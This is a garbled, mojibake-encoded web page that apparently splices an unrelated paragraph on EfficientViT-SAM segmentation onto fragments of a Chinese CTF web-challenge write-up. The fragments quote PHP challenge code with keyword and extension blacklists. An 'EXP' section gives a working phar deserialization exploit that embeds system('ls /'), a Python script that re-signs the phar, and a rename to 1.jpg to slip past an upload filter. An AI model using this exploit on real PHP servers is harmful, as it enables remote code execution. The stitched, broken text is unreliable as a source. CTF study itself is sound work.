</h2><p>‰ªªÊÑèÂàÜÂâ≤Ê®°Âûã (SAM) ÊòØ‰∏ÄÁ≥ªÂàóÂõæÂÉèÂàÜÂâ≤Ê®°ÂûãÔºåÂú®ÂåÖÂê´ 11M Âº†ÂõæÂÉèÂíå 1B ‰∏™Êé©Á†ÅÁöÑÈ´òË¥®ÈáèÊï∞ÊçÆÈõÜ‰∏äËøõË°åÈ¢ÑËÆ≠ÁªÉ„ÄÇSAM Êèê‰æõ‰ª§‰∫∫ÊÉäÂèπÁöÑÈõ∂Ê†∑Êú¨ÂõæÂÉèÂàÜÂâ≤ÊÄßËÉΩÔºåÂπ∂‰∏îÂÖ∑ÊúâËÆ∏Â§öÂ∫îÁî®ÔºåÂåÖÊã¨ AR/VR„ÄÅÊï∞ÊçÆÊ≥®Èáä„ÄÅ‰∫§‰∫íÂºèÂõæÂÉèÁºñËæëÁ≠â„ÄÇ</p>
<p>Â∞ΩÁÆ°ÊÄßËÉΩÂº∫Â§ßÔºå‰ΩÜ SAM ËÆ°ÁÆóÈáèÂæàÂ§ßÔºåÈôêÂà∂‰∫ÜÂÖ∂Âú®Êó∂Èó¥ÊïèÊÑüÂú∫ÊôØ‰∏≠ÁöÑÈÄÇÁî®ÊÄß„ÄÇÁâπÂà´ÊòØÔºåSAM ÁöÑ‰∏ªË¶ÅËÆ°ÁÆóÁì∂È¢àÊòØÂÖ∂ÂõæÂÉèÁºñÁ†ÅÂô®ÔºåÂú®Êé®ÁêÜÊó∂ÊØèÂπÖÂõæÂÉèÈúÄË¶Å 2973 ‰∏™ GMAC„ÄÇ‰∏∫‰∫ÜÂä†ÈÄü SAMÔºå‰∫∫‰ª¨ÂÅöÂá∫‰∫ÜËÆ∏Â§öÂä™ÂäõÔºåÁî®ËΩªÈáèÁ∫ßÊ®°ÂûãÂèñ‰ª£ SAM ÁöÑÂõæÂÉèÁºñÁ†ÅÂô®„ÄÇ‰æãÂ¶ÇÔºåMobileSAMÂ∞Ü SAM ÁöÑ ViT-H Ê®°ÂûãÁöÑÁü•ËØÜÊèêÁÇºÊàê‰∏Ä‰∏™ÂæÆÂûãËßÜËßâËΩ¨Êç¢Âô®„ÄÇ EdgeSAM ËÆ≠ÁªÉÁ∫Ø CNN Ê®°ÂûãÊù•Ê®°Êãü ViT-HÔºåÈááÁî®ÁªÜËá¥ÁöÑËí∏È¶èÁ≠ñÁï•ÔºåÂπ∂Âú®ËøáÁ®ã‰∏≠ÂºïÂÖ•‰∫ÜÊèêÁ§∫ÁºñÁ†ÅÂô®ÂíåÊé©Á†ÅËß£Á†ÅÂô®„ÄÇEfficientSAMÂà©Áî® MAE È¢ÑËÆ≠ÁªÉÊñπÊ≥ïÊù•ÊèêÈ´òÊÄßËÉΩ„ÄÇ</p>
<p>ËôΩÁÑ∂Ëøô‰∫õÊñπÊ≥ïÈôç‰Ωé‰∫ÜËÆ°ÁÆóÊàêÊú¨Ôºå‰ΩÜÂÆÉ‰ª¨ÈÉΩÈÅ≠Âèó‰∫ÜÊòæËëóÁöÑÊÄßËÉΩ‰∏ãÈôçÔºàÂõæ 1Ôºâ„ÄÇÊú¨Á†îÁ©∂ÂºïÂÖ•‰∫Ü EfficientViT-SAM Êù•Ëß£ÂÜ≥Ëøô‰∏ÄÈôêÂà∂ÔºåÂà©Áî® EfficientViT ÊõøÊç¢ SAM ÁöÑÂõæÂÉèÁºñÁ†ÅÂô®„ÄÇÂêåÊó∂ÔºåÊàë‰ª¨‰øùÁïô‰∫Ü SAM ÁöÑËΩªÈáèÁ∫ßÊèêÁ§∫ÁºñÁ†ÅÂô®ÂíåÊé©Á†ÅËß£Á†ÅÂô®Êû∂ÊûÑ„ÄÇÊàë‰ª¨ÁöÑËÆ≠ÁªÉËøáÁ®ãÂåÖÊã¨‰∏§‰∏™Èò∂ÊÆµ„ÄÇÈ¶ñÂÖàÔºåÊàë‰ª¨‰ΩøÁî® SAM ÁöÑÂõæÂÉèÁºñÁ†ÅÂô®‰Ωú‰∏∫ËÄÅÂ∏àÊù•ËÆ≠ÁªÉ EfficientViT-SAM ÁöÑÂõæÂÉèÁºñÁ†ÅÂô®„ÄÇÂÖ∂Ê¨°ÔºåÊàë‰ª¨Âú®Êï¥‰∏™ SA-1B Êï∞ÊçÆÈõÜ ‰∏äÁ´ØÂà∞Á´ØËÆ≠ÁªÉ EfficientViTSAM„ÄÇ</p>
<p>Êàë‰ª¨Âú®‰∏ÄÁ≥ªÂàóÈõ∂Ê†∑Êú¨Âü∫ÂáÜ‰∏äÂØπ EfficientViT-SAM ËøõË°å‰∫ÜÂÖ®Èù¢ËØÑ‰º∞ÔºåÂåÖÊã¨ÁÇπÊèêÁ§∫ÂàÜÂâ≤„ÄÅÊ°ÜÊèêÁ§∫ÂàÜÂâ≤ÂíåÈáéÂ§ñÂàÜÂâ≤„ÄÇ‰∏éÊâÄÊúâ‰ª•ÂâçÁöÑ SAM Ê®°ÂûãÁõ∏ÊØîÔºåEfficientViT-SAM Êèê‰æõ‰∫ÜÊòæÁùÄÁöÑÊÄßËÉΩ/ÊïàÁéáÊèêÂçá„ÄÇÁâπÂà´ÊòØÂú® COCO Êï∞ÊçÆÈõÜ‰∏äÔºå‰∏é SAM-ViT-HÁõ∏ÊØîÔºåEfficientViT-SAM Âú® A100 GPU ‰∏äÂÆûÁé∞‰∫Ü 48.9 ÂÄçÁöÑÂêûÂêêÈáèÔºå‰∏îÊ≤°Êúâ mAP ‰∏ãÈôç„ÄÇ</p>

</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">content</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">stristr</span><span class="p">(</span><span class="o">$</span><span class="n">content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">filename</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">&#34;/[^a-z\.]/&#34;</span><span class="p">,</span> <span class="o">$</span><span class="n">filename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">files</span> <span class="o">=</span> <span class="n">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"> <span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">files</span> <span class="n">as</span> <span class="o">$</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">is_file</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Hello, world&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span> </span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®ÁõÆÂΩï‰∏ãÔºå<strong>Âè™Êúâindex.phpËÉΩÂ§ü‰Ωú‰∏∫phpËß£ÊûêÊâßË°å</strong></p>
<p>ÂèØ‰ª•ÂÜô‰∏Ä‰∏™.htaccessËÆ©index.phpËá™Âä®ÂåÖÂê´ÊâßË°å‰ª£Á†ÅÊù•ÂÆûÁé∞Êàë‰ª¨ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÊâßË°å</p>
<ul>
<li>
<p>‰ª£Á†ÅÂÆ°ËÆ°</p>
<p>ËÆøÈóÆindex.phpÊó∂Âà†Èô§ÊâÄÊúâÈô§‰∫Üindex.phpÁöÑÊñá‰ª∂</p>

</div>
</div><p>ÂØπ‰∏ä‰º†ÂÜÖÂÆπËøáÊª§ÔºåÂØπÊñá‰ª∂ÂêçËøõË°å‰∫ÜËøáÊª§</p>

</div></li>

</li>
<li>

</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Êñá‰ª∂Â∑≤ÁªèÂ≠òÂú®&#34;</span><span class="p">;</span>

</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">myfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;./upload/&#34;</span><span class="o">.$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">],</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="n">fwrite</span><span class="p">(</span><span class="o">$</span><span class="n">myfile</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span><span class="p">);</span>

</span></span><span class="line"><span class="cl"> <span class="n">echo</span> <span class="s2">&#34;‰∏ä‰º†ÊàêÂäü ./upload/&#34;</span><span class="o">.$</span><span class="n">_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>

</span></span><span class="line"><span class="cl"> <span class="p">}</span>

</div><ul>
<li>ÂØπ‰∏ä‰º†ÁöÑÊñá‰ª∂ËøõË°å‰∫Ü gif„ÄÅjpeg„ÄÅjpg„ÄÅpng ÁöÑÂêéÁºÄÂêçÊ£ÄÊµã</li>

</ul>
</li>

</li>

<h2 id="exp" class="heading-element"><span>EXP</span>

</h2><p>ÂÖàÁîüÊàêpharÂèçÂ∫èÂàóÂåñÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1

<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">class LoveNss{
</span></span><span class="line"><span class="cl"> public $ljt=&#34;Misc&#34;;
</span></span><span class="line"><span class="cl"> public $dky=&#34;Re&#34;;
</span></span><span class="line"><span class="cl"> public $cmd=&#34;system(&#39;ls /&#39;);&#34;;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$a = new LoveNss();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$phar = new Phar(&#34;phar.phar&#34;);
</span></span><span class="line"><span class="cl">$phar-&gt;startBuffering();
</span></span><span class="line"><span class="cl">$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); //ËÆæÁΩÆstub
</span></span><span class="line"><span class="cl">$phar-&gt;setMetadata($a); //Ëá™ÂÆö‰πâÁöÑmeta-data
</span></span><span class="line"><span class="cl">$phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂
</span></span><span class="line"><span class="cl">//Á≠æÂêçËá™Âä®ËÆ°ÁÆó,ÈªòËÆ§ÊòØSHA1
</span></span><span class="line"><span class="cl">$phar-&gt;stopBuffering();</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêé‰øÆÊîπphar.pharÁöÑÂ∫èÂàóÂåñÂÄº„ÄÇ</p>
<blockquote>
<p>Áî®hexÊü•ÁúãÂéüÊñá</p>
</blockquote>
<p>ÁÑ∂ÂêéÈáçÊñ∞Á≠æÂêç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1

<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from hashlib import sha1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">file = open(&#39;phar.phar&#39;, &#39;rb&#39;).read()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">data = file[:-28] # Ë¶ÅÁ≠æÂêçÁöÑÈÉ®ÂàÜÊòØÊñá‰ª∂Â§¥Âà∞metadataÁöÑÊï∞ÊçÆ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">final = file[-8:]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">newfile = data + sha1(data).digest() + final
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">open(&#39;newpoc.phar&#39;, &#39;wb&#39;).write(newfile)</span></span></code></pre></td></tr></table>

</div><p>ÁÑ∂ÂêéÈáçÂëΩÂêçÔºåÁªïËøáÊ£ÄÊµãphar</p>

</span></span><span class="line"><span class="cl">rename(&#34;newpoc.phar.gz&#34;, &#34;1.jpg&#34;);</span></span></code></pre></td></tr></table>

<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">error_reporting(0);
</span></span><span class="line"><span class="cl">//Âê¨ËØ¥‰Ω†ÂæàÂñúÊ¨¢Êï∞Â≠¶Ôºå‰∏çÁü•ÈÅì‰Ω†ÊòØÂê¶Áà±ÂÆÉËÉúËøáÁà±flag
</span></span><span class="line"><span class="cl">if(!isset($_GET[&#39;c&#39;])){
</span></span><span class="line"><span class="cl"> show_source(__FILE__);
</span></span><span class="line"><span class="cl">}else{
</span></span><span class="line"><span class="cl"> //‰æãÂ≠ê c=20-1
</span></span><span class="line"><span class="cl"> $content = $_GET[&#39;c&#39;];
</span></span><span class="line"><span class="cl"> if (strlen($content) &gt;= 80) {
</span></span><span class="line"><span class="cl"> die(&#34;Â§™Èïø‰∫Ü‰∏ç‰ºöÁÆó&#34;);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
</span></span><span class="line"><span class="cl"> foreach ($blacklist as $blackitem) {
</span></span><span class="line"><span class="cl"> if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
</span></span><span class="line"><span class="cl"> die(&#34;ËØ∑‰∏çË¶ÅËæìÂÖ•Â•áÂ•áÊÄ™ÊÄ™ÁöÑÂ≠óÁ¨¶&#34;);
</span></span><span class="line"><span class="cl"> }
